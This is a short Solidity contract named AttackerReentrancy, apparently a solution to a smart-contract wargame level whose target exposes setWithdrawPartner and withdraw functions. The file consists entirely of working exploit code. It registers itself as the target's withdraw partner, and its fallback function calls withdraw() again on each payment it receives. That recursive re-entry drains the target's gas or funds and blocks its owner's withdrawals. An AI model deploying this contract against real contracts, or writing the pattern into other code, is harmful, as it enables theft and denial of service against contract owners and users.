pragma solidity ^0.8.0;

contract AttackerReentrancy {

    address public denial;
    uint256 public calls;

    constructor(address payable _denial) {
        denial = _denial;
    }

    function setPartner() external {
        (bool success, ) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)"     , address(this)));
        require(success, "set partner failed");
    }

    // Fallback function to trigger reentrancy
    fallback() external payable {
        calls += 1;
        (bool success, ) = denial.call(abi.encodeWithSignature("withdraw()"));
        require(success, "reentrancy failed");
    }

    receive() external payable {
        // Optional: allow deposits
    }

}